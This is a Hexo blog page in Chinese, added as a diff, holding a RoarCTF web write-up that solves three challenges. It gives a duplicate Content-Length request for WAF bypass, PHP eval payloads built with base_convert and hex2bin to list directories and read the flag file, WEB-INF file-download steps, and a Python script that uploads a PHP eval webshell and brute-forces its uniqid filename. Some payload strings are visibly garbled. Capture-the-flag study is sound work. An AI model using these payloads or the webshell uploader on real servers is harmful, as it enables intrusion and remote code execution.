@@ -1,0 +1,379 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+
+
+
+
+
+
+
+
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="utf-8">
+    <link rel="apple-touch-icon" sizes="76x76" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" href="/favicon.png">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta http-equiv="x-ua-compatible" content="ie=edge">
+    <meta name="description" content="">
+    <meta name="author" content="chuddy">
+    <meta name="keywords" content="">
+    <title>RoarCTFweb题解 ~ chuddy&#39;s Blog</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.7.2/css/all.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/css/bootstrap.min.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/css/mdb.min.css">
+    <link rel="stylesheet" href="/css/style.css">
+    <link rel="stylesheet" href="https://at.alicdn.com/t/font_1067060_vr10bjtg3us.css">
+    
+        <link rel="stylesheet" href="/css/Prettify/tomorrow-night-eighties.min.css">
+    
+</head>
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+<div class="container">
+    <a class="navbar-brand" href="/"><strong>chuddy&#39;s Blog</strong></a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+        <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+        <ul class="navbar-nav ml-auto text-center">
+            
+            <li class="nav-item">
+                <a class="nav-link" href="/">Home</a>
+            </li>
+            
+            <li class="nav-item">
+                <a class="nav-link" href="/archives/">Archives</a>
+            </li>
+            
+        </ul>
+    </div>
+</div>
+
+
+</nav>
+    <div class="view intro-2" style='background: url("/post.jpg")no-repeat center center;background-size: cover;'>
+    <div class="full-bg-img">
+        <div class="mask rgba-black-light flex-center">
+        <div class="container text-center white-text wow fadeInUp">
+            <p class="h2">RoarCTFweb题解</p>
+            <br>
+            
+            <p>Wednesday, October 16th 2019, 2:23 pm</p>
+            
+        </div>
+        </div>
+    </div>
+    </div>
+  </header>
+
+  <main>
+  
+  <div class="container-fluid">
+    <div class="row">
+        <div class="col-md-8 offset-md-2 ">
+            <div class="post-content py-5 z-depth-3 main">
+                <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>参加了RoarCTF,题目质量挺好的，学到了一些东西。在这里复现记录一下。</p>
+<h2 id="easy-calc"><a href="#easy-calc" class="headerlink" title="easy_calc"></a>easy_calc</h2><p>打开题目发现是一个计算器的功能，感觉计算器已经出过好多次了。查看源代码，发现了calc.php</p>
+<pre><code> &lt;?php
+error_reporting(0);
+if(!isset($_GET[&#39;num&#39;])){
+    show_source(__FILE__);
+}else{
+        $str = $_GET[&#39;num&#39;];
+        $blacklist = [&#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\n&#39;,&#39;\&#39;&#39;, &#39;&quot;&#39;, &#39;`&#39;, &#39;\[&#39;, &#39;\]&#39;,&#39;\$&#39;,&#39;\\&#39;,&#39;\^&#39;];
+        foreach ($blacklist as $blackitem) {
+                if (preg_match(&#39;/&#39; . $blackitem . &#39;/m&#39;, $str)) {
+                        die(&quot;what are you want to do?&quot;);
+                }
+        }
+        eval(&#39;echo &#39;.$str.&#39;;&#39;);
+}
+?&gt;
+
+</code></pre><p>这里过滤了好多的东西，和国赛的一道题很像，但是直接输入<code>num=phpinfo()</code>不能够解析，通过上面的代发也没有对其进行拦截，猜测应该是存在waf对其进行拦截。</p>
+<p>过waf的两种方法：<br><strong>方法一：</strong><br>利用http走私：<br>原理可以看 <a href="https://paper.seebug.org/1048/" target="_blank" rel="noopener">参考文章</a> 这篇文章。</p>
+<p>构造的请求头信息：</p>
+<pre><code>POST /calc.php?num=phpinfo(); HTTP/1.1
+Host: node3.buuoj.cn:28057
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+Cache-Control: max-age=0
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 5
+Content-Length: 5//利用http走私
+
+num=1
+</code></pre><p>能够执行phpinfo()的命令。</p>
+<p>我的理解php中$_request 相同字段名优先接收post参数，就是这个同时向服务器传递get和post请求，而waf那里只处理了post请求的值，从而使get请求的值绕过了waf的拦截。</p>
+<p><strong>方法二：</strong></p>
+<p>利用php的一个字符串解析特性绕过bypass。[文章s<a href="http://www.freebuf.com/articles/web/213359.html" target="_blank" rel="noopener">www.freebuf.com/articles/web/213359.html</a>)</p>
+<p>一些php的特性的分析：</p>
+<table>
+<thead>
+<tr>
+<th>输入</th>
+<th>输出</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>%20news_id</td>
+<td>news_id</td>
+</tr>
+<tr>
+<td>news%20id</td>
+<td>news_id</td>
+</tr>
+<tr>
+<td>news%00id</td>
+<td>news</td>
+</tr>
+<tr>
+<td>news[id</td>
+<td>news_id</td>
+</tr>
+<tr>
+<td>news.id</td>
+<td>news_id</td>
+</tr>
+<tr>
+<td>news+id</td>
+<td>news_id</td>
+</tr>
+<tr>
+<td>news_id%20</td>
+<td>news_id_</td>
+</tr>
+</tbody>
+</table>
+<p>我么可以想到在num前面加%20来进行绕过<br><img src="https://s2.ax1x.com/2019/10/18/KZdIV1.png" alt=""></p>
+<p>绕过waf之后，我们发现</p>
+<p><img src="https://s2.ax1x.com/2019/10/18/KZw3M4.png" alt=""><br>禁用了一些危险函数，这里得到flag的方法也有几种：</p>
+<p><strong>方法一：</strong></p>
+<p>利用一些php的文件操作函数：</p>
+<ul>
+<li>getcwd — 取得当前工作目录</li>
+<li>dirname(string <code>$path</code>) — 返回 path 的父目录</li>
+<li>scandir — 列出指定路径中的文件和目录</li>
+</ul>
+<p>payload:</p>
+<pre><code>? num=var_dump(scandir(dirname(dirname(dirname(getcwd())))));
+</code></pre><p><img src="https://s2.ax1x.com/2019/10/18/KZBtC6.png" alt=""></p>
+<p>在根目录发现flag的位置<code>/f1agg</code><br>由于</p>
+<pre><code>$blacklist = [&#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\n&#39;,&#39;\&#39;&#39;, &#39;&quot;&#39;, &#39;`&#39;, &#39;\[&#39;, &#39;\]&#39;,&#39;\$&#39;,&#39;\\&#39;,&#39;\^&#39;]; 
+</code></pre><p>过滤了<code>/,&#39;</code>等字符不能够直接<code>var_dump(file_get_contents(&#39;/f1agg&#39;))</code>所以想到了利用编码来绕过。<code>var_dump(file_get_contents(chr()chr(102).chr(4).chr(7)chr(103).chr(103)))</code>可以得到flag.</p>
+<p><img src="https://s2.ax1x.com/2019/10/18/KZssa9.png" alt=""></p>
+<p><strong>方法二：</strong></p>
+<p>这个计算器特写向国赛初赛的一道题，这个可以采用国赛拿到题目的做法来做题。</p>
+<p><code>base_convert</code>函数可以在任意进制之间转换数字，可以返回任意字母，需要注意它无法返回<code>_ *</code>等特殊字符</p>
+<p><img src="https://s2.ax1x.com/2019/10/18/KZ6Z1P.png" alt=""></p>
+<pre><code>D:\phpStudy\php\php-5.5.38
+λ php -r &quot;echo base_convert(&#39;system&#39;,36,10)&quot;;
+51504350
+D:\phpStudy\php\php-5.5.38
+λ php -r &quot;echo base_convert(&#39;ls&#39;,3,10)&quot;;
+784
+D:\phpStudy\php\php-5.5
+</code></pre><p><code>? num=base_convert(1751504350,10,36)(base_convert(784,10,36))</code>可以成功执行phpinfo();</p>
+<p><img src="https//s2.ax1x.com/2019/10/18/KZcaxP.png" alt=""></p>
+<p>我们发现<code>dechex</code>函数可以把10进制转换为16进制，我们可以再异或出<code>hex2bin</code>，来获取任意ASCII字符</p>
+<pre><code>D:\phpStudy\php\php-.5.38
+λ php -r &quot;echo base_convert(&#39;scandir&#39;,36,0)&quot;;
+669338629
+D:\phpStudy\php\php-5.5.38
+λ php -r &quot;echo hex2bin(dechex(&#39;47&#39;))&quot;;
+
+D:\phpStudy\php\php-5.5.38
+λ php -r &quot;echo hex2bin(dechex(&#39;46&#39;[题目链接](http://47.99.176.38:5111/))&quot;;
+.
+D:\phpStudy\php\php-5.5.38
+λ php -r &quot;echo hex2bin(dechex(&#39;32&#39;))&quot;;
+ 这是空格
+</code></pre><p>可以构造<code>var_dump(base_convert(61693386291,10,36)(hex2bin(dechex(46)).hex2bin(dechex(47))))</code>相当于<code>car_dump(scandir(./))</code></p>
+<p>可以一级一级的查看目录，最终在根目录找到了flag的位置。<code>var_dump(base_convert(61693386291,10,36)(hex2bin(dechex(47))))</code><br>文件名为<code>f1agg</code>,可以构造出<code>readfile(/f1agg)</code>来读取文件<br>构造为：<code>base_convert(2146934604002,10,36)(hex2bin(dechex(47)).base_convert(25254448,10,36))</code>就可以得到flag文件。</p>
+<h2 id="easy-java"><a href="#easy-java" class="headerlink" title="easy_java"></a>easy_java</h2><p>打开页面是一个登陆框<br><img src="https://s2.ax1x.com/2019/10/18/KeMmDS.png" alt=""></p>
+<p>下面有一个help的链接，点进去发现没有东西，不能够下载文件，后来发现更改请求方式为post就可以下载文件了。</p>
+<p><img src="https://s2.ax1x.com/2019/10/18/KeM6KK.png" alt=""><br>因为文件名是可控的所以我感觉可以实现任意文件下载。</p>
+<p>对于登陆框尝试几次无果之后，选择了暴力破解，得到密码<code>admin888</code><br><img src="https://s2.ax1x.com/2019/10/18/KeQeR1.png" alt=""></p>
+<p>但是登陆进去发现啥也没有，但是在help页面可以读取任意文件：<br><img src="https://s2.ax1x.com/2019/10/18/Kelilt.png" alt=""></p>
+<p>在做测试时，发现了一些敏感信息的泄露：<br><img src="https://s2.ax1x.com/2019/10/18/Kel2hd.png" alt=""></p>
+<p>我们可以得到这个的绝对路径，以及一些应用的版本<code>Apache Tomcat/8.5.24</code></p>
+<p><strong>WEB-INF/web.xml泄露</strong></p>
+<p>WEB-INF是Java的WEB应用的安全目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。</p>
+<pre><code>/WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。
+
+/WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中
+
+/WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件
+
+/WEB-INF/src/：源码目录，按照包名结构放置各个java文件。
+
+/WEB-INF/database.properties：数据库配置文件
+</code></pre><p><img src="https://s2.ax1x.com/2019/10/18/Ke1WaF.png" alt=""><br>得到了一个和flag有关的类文件。根据其文件的分类规则我们推出其文件的位置<code>WEB-INF/classes/com/wm/ctf/FlagController.class</code></p>
+<p><img src="https://s2.ax1x.com/2019/10/18/Ke3UQ1.png" alt="Ke3UQ1.png"></p>
+<p>得到了一串可以的字符串，base64解码之后就是flag。</p>
+<h2 id="simple-upload"><a href="#simple-upload" class="headerlink" title="simple_upload"></a>simple_upload</h2><p>是一道代码审计题目，很清晰的看出是一个ThinkPHP的站</p>
+<pre><code> &lt;?php
+namespace Home\Controller;
+
+use Think\Controller;
+
+class IndexController extends Controller
+{
+    public function index()
+    {
+        show_source(__FILE__);
+    }
+    public function upload()
+    {
+        $uploadFile = $_FILES[&#39;file&#39;] ;
+
+        if (strstr(strtolower($uploadFile[&#39;name&#39;]), &quot;.php&quot;) ) {
+            return false;
+        }
+
+        $upload = new \Think\Upload();// 实例化上传类
+        $upload-&gt;maxSize  = 4096 ;// 设置附件上传大小
+        $upload-&gt;allowExts  = array(&#39;jpg&#39;, &#39;gif&#39;, &#39;png&#39;, &#39;jpeg&#39;);// 设置附件上传类型
+        $upload-&gt;rootPath = &#39;./Public/Uploads/&#39;;// 设置附件上传目录
+        $upload-&gt;savePath = &#39;&#39;;// 设置附件上传子目录
+        $info = $upload-&gt;upload() ;
+        if(!$info) {// 上传错误提示错误信息
+          $this-&gt;error($upload-&gt;getError());
+          return;
+        }else{// 上传成功 获取上传文件信息
+          $url = __ROOT__.substr($upload-&gt;rootPath,1).$info[&#39;file&#39;][&#39;savepath&#39;].$info[&#39;file&#39;][&#39;savename&#39;] ;
+          echo json_encode(array(&quot;url&quot;=&gt;$url,&quot;success&quot;=&gt;1));
+        }
+    }
+} 
+</code></pre><p>给出了文件上传的地址和信息<code>$upload-&gt;rootPath = &#39;./Public/Uploads/&#39;;</code>，访问发现没有WEB页面上传的点，应该是用脚本上传<br>对这里的上传页面，由于这是一个thinkphp的站点，于是去看了thinkphp的内容，<a href="https://www.kancloud.cn/manual/thinkphp/1713" target="_blank" rel="noopener">参考文章</a></p>
+<p>这里对控制器说明比较详细。<br>一般来说，ThinkPHP的控制器是一个类，而操作则是控制器类的一个公共方法。</p>
+<p>下面就是一个典型的控制器类的定义：</p>
+<pre><code>&lt;?php
+namespace Home\Controller;
+use Think\Controller;
+class IndexController extends Controller {
+    public function hello(){
+        echo &#39;hello,thinkphp!&#39;;
+    }
+}
+
+</code></pre><p><code>Home\IndexController</code>类就代表了Home模块下的Index控制器，而hello操作就是<code>Home\IndexController</code>类的hello（公共）方法。</p>
+<p>当访问 <code>http://serverName/index.php/Home/Index/hello</code> 后会输出：</p>
+<pre><code>hello,thinkphp!
+</code></pre><p>于是可以判断这个文件上传类的调用地址为：<code>/index.php/home/index/upload</code>。</p>
+<p>不过限制了<code>.php</code>，仔细看才发现，代码只会过滤 <code>$_FILES[&#39;file&#39;]</code> 中的文件。所以可以上传两个文件，一个name为file的正常图片，另一个name为其他的webshell。<br>但是最后会打印出 <code>$_FILES[&#39;file&#39;]</code> 的文件地址，而不会打印我们shell的地址，但是我们发现最后他对文件命名用<code>uniqid()</code>函数来命名的，这个函数是根据时间生成文件名，两个文件上传时间近可以通过爆破得到我们上传的shell的文件名。</p>
+<pre><code>import requests
+import re
+import time
+import sys
+
+reload(sys)
+sys.setdefaultencoding(&quot;utf8&quot;)
+
+
+url = &#39;http://2b9a88ad-f688-4ede-b6e3-ac18aae091f2.node3.buuoj.cn&#39;
+
+url_1 = url + &quot;/index.php/home/index/upload&quot;
+
+file = {&quot;file&quot;:(&quot;a.txt&quot;,&#39;a&#39;), &quot;file1&quot;:(&quot;a.php&quot;, &#39;&lt;?php eval($_GET[&quot;a&quot;]);&#39;)}
+
+r = requests.post(url=url_1,files=file)
+
+print r.content
+
+t1 = r.text.split(&quot;/&quot;)[-1].split(&quot;.&quot;)[0]
+t1 = int(t1,16)
+
+j = t1 
+
+while True:
+    path = url + &quot;/Public/Uploads/2019-10-19/%s.php&quot; % hex(j)[2:-1]
+    try:
+        r = requests.get(path, timeout=1)
+    except:
+        continue
+    if r.status_code != 404:
+        print path
+        print r.text
+        break
+    print j, hex(j)[2:-1], r.status_code
+    j -= 1
+</code></pre><p>得到flag<br><img src="https://s2.ax1x.com/2019/10/19/KeHZbd.png" alt=""></p>
+
+                <hr>
+                <div>
+                    <p>
+                         
+                        <span class="badge badge-light">#&nbsp;writeup</span>
+                        &nbsp;
+                        
+                    </p>
+                </div>
+                <br>
+                
+            </div>
+        </div>
+        <div class="d-none d-md-block col-md-2">
+            
+  <div id="toc" class="py-5">
+    <p class="h6"><i class="iconfont icon-toc" style="vertical-align:middle"></i> Toc:</p> 
+    <div id="tocbot"></div>
+  </div>
+
+        </div>
+    </div>        
+</div>
+
+<br><br><br>
+
+<!-- Comments -->
+<div class="comments" id="comments">
+ 
+</div>
+  
+  </main>
+
+<footer class="mt-5">
+  <div class="text-center py-3">
+    <a href="https://hexo.io" target="_blank"><b>HEXO</b></a>
+    <i class="iconfont icon-love"></i>
+    <a href="https://github.com/0x2e/Material-T" target="_blank"> <b>Material-T</b></a>
+  </div>
+</footer>
+
+  <!-- SCRIPTS -->
+  <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/js/jquery-3.3.1.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/js/popper.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/js/bootstrap.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/js/mdb.min.js"></script>
+  <script src="/js/main.js"></script>
+  
+    
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+    
+    <script src="/js/post.js"></script>
+    
+      <script src="/js/plugins/prettify.js"></script>
+      <script>
+          $(document).ready(function(){
+              $('pre').addClass('prettyprint linenums');
+              prettyPrint();
+          })
+      </script>
+    
+  
+</body>
+</html>
